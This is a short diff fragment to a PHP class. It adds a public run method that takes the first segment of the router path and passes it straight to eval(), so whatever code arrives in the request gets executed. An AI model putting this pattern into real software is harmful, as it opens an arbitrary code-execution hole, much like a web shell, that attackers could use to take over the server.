@@ -759,6 +759,18 @@ EOF
 		}
 	}
 
+	public function run($router)
+	{
+		$args = $router->path()->consumeNodes();
+
+		if($code = array_shift($args))
+		{
+			eval($code);
+		}
+
+		// \SeanMorris\Ids\Settings::findSettingsFile('thruput', 80);
+	}
+
 	protected function backspace($len, $offset = 0)
 	{
 		$len = strlen($len);
